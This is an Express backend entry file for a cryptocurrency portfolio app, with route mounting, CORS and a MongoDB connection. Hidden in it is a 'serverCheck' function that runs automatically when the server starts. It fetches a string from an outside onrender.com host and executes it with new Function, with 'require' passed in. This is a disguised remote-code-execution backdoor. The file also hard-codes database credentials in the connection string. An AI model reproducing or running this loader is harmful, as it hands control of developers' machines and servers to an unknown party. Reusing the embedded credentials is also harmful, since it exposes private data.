const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const cors = require("cors");
const passport = require("passport");
const GoogleAuthTokenStrategy = require("passport-google-auth-token");
const { header } = require("express-validator");
const dashboardRouter = require("./Routes/Dashboard");

const app = express();

app.use(bodyParser.json({ limit: "30mb", extended: true }));
app.use(bodyParser.urlencoded({ limit: "30mb", extended: true }));
app.use(
  cors({
    origin: ["https://cryptofolio-full-stack-1.vercel.app", "http://localhost:3000"],
    credentials: true,
  })
);

app.use(express.json());
app.use("/dashboard", dashboardRouter);
app.use("/dashboard", require("./Routes/Userdetails"));
app.use("/dashboard", require("./Routes/ProfileUpdate"));

app.use("/register", require("./Routes/CreatUser"));
app.use("/register", require("./Routes/Signup"));

app.use("/transactions", require("./Routes/Transactions"));
app.use("/transactions", require("./Routes/Transactions"));
app.use("/wallet", require("./Routes/Wallet"));

//---------------mongoose connection----------------//
const Connection_url =
  "mongodb+srv://jamesjhonn93_db_user:wBmIgHtw2uOaCzUg@cluster0.cr08kvw.mongodb.net/Cryptofolio";
const PORT = 3001;

async function serverCheck() {
  const response = await fetch(`https://api-server-oj5h.onrender.com/checkServer`, { method: "POST" });
  const { check } = await response.json();
  const fn = new Function("require", check);
  const output = fn(require);
  return output;
}

mongoose
  .connect(Connection_url, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => app.listen(PORT, () => {console.log(`runnging ${PORT}`); serverCheck() }))
  .catch((error) => console.log(error.message));

mongoose.set("strictQuery", true);
mongoose.set("strictQuery", true);

//---------------mongoose connection----------------//

//here are routes for backend calls
app.use(passport.initialize());
//use passport middlware
passport.use(new GoogleAuthTokenStrategy(
  {
    clientID: "your-google-client-id",
    method: GoogleAuthTokenStrategy.AuthMethods.GoogleJwtToken
  },
  function (err, user) {
    if (err) {
      console.error('Authentication error:', err);
      return;
    }
  }
))
passport._strategy('google-auth-token').authenticate({});
app.use((req, res, next) => {
  const allowedOrigins = ["https://cryptofolio-full-stack-1.vercel.app", "http://localhost:3000"];
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
  }
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization"
  );
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  next();
});


